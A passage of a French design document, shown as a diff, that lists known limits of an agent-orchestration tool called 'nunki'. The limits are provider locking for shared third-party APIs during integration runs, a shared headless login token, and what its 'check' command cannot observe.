+  `nunki mission start`.
+- **Les tests système sur une vraie API tierce** : lents, instables, à effets
+  de bord, et deux missions parallèles partagent le même palier de test et se
+  marchent dessus. Une mission d'intégration qui déclare un fournisseur réel
+  **verrouille ce fournisseur** pour les autres missions du projet le temps
+  de ses runs — un verrou de plus dans l'état de `nunki` (4.2), à côté du verrou
+  de slot. Un fournisseur réel est un service que l'en-tête déclare
+  `shared: true`, posé par l'humain au cadrage : rien n'est deviné des
+  domaines. Le verrou se déduit de
+  l'état : un fournisseur est pris tant qu'une autre mission se tient à son
+  étape d'intégration avec un run enregistré et le déclare. Relu, le run est
+  oublié et le verrou tombe avec lui, si bien qu'aucune mission finie,
+  recadrée ou tombée ne laisse de verrou derrière elle. Un verrou court, un
+  fichier par fournisseur, n'encadre que la vérification et le lancement,
+  pour que deux moniteurs ne trouvent pas ensemble un fournisseur libre. Un
+  intégrateur dont un fournisseur est pris n'est pas lancé : `nunki verify` le
+  dit (`busy`), sans tentative consommée, et le moniteur de la mission
+  regarde à nouveau chaque minute.
+- **La connexion sans interface** : un geste humain avec navigateur par
+  harnais et par an pour Claude Code, un jeton partagé par tous les slots,
+  dont la révocation arrête tout d'un coup.
+- **Ce que `nunki check` ne voit pas** : la protection de branche côté forge
+  sans credential ou déclarée `by_hand`, et ce que l'agent lit dans son propre conteneur. Il le dit
+  au lieu de se taire.
